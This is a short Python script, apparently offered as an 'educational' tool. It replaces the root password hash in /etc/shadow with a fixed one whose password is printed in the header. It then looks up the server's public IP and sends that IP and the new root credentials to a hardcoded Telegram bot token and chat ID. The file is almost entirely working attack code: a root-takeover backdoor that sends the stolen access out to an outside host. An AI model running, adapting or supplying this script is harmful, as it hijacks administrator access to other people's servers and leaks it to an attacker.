#!/usr/bin/evn python3
# encoding: utf-8

__author__ = 'Zwdeff'
__version__ = '0.2'

# {Script para fins educacionais, não utilize para fins Maliciosos.}
# [Github] https://www.github.com/Xdwnff-04x
# [Telegram - Channel] https://telegram.me/ZWDChannel
# [Telegram - PV] @nZwdeff
# [Nova senha] : ZWDPassNoob
# 
# [License]
#   Licensed under the Apache License, Version 2.0 (the "License"); you may
#   not use this file except in compliance with the License. You may obtain
#   a copy of the License at
#
#        http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#   WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#   License for the specific language governing permissions and limitations
#   under the License.

import sys
import os, re
import fileinput
from os import system
from time import strftime
from urllib.request import urlopen

u1 = '\033[31m'
u0 = '\033[m'

if os.path.isfile('/usr/local/bin/pip3') == False:
   system('apt-get install python3-pip -y 1> /dev/null')
   
if os.path.isfile('/usr/local/lib/python3.4/dist-packages/requests/__init__.py') == False:
   system('pip3 install requests 1> /dev/null')

import requests

if os.path.isfile('/etc/Z/z') == False:
   system('mkdir /etc/Z && touch /etc/Z/z')
   
__url_ = str(urlopen('http://check-host.net/ip').read())
IP = re.compile(r'(\d+\.\d+\.\d+\.\d+)').search(__url_).group()

system('cat /etc/shadow | grep root > /etc/Z/z')

f = open('/etc/Z/z', 'r')
for passwd in f:
    for i, line in enumerate(fileinput.input('/etc/shadow', inplace=1)):
        sys.stdout.write(line.replace(passwd, 'root:$6$KBMdNc/x$HZPYAQlU6sOioV13I.7oiCFwMXiuu2giJG9DF8HWDwdYMC3WKcqITVA/ND0E0pFJ8OFy55QSH9X1HNG/sOb6Z1:17368::::::\n'))
        
f.close()

New = 'Senha Alterada ...\n'
H = 'Hora: %s\n' % strftime('%H:%M:%S')
D = 'Data: %s\n' % strftime('%d/%m/%Y')
IP = 'Address IP: %s\n' % IP
nome = 'Nome: root\n'
senha = 'Senha: ZWDPassNoob\n\n'

# Seu ID para o Bot te avisar quando a senha for alterada.
ID = '116117510'
# Token do Bot que irar te mandar a nova senha com IP do servidor.
Token = '438063530:AAGk4rLwsT6GUsf5btO4agEb0VHevwyY7h0'

web = 'https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s%s%s%s%s%s'\
% (Token,ID,New,H,D,IP,nome,senha)

requests.get(web)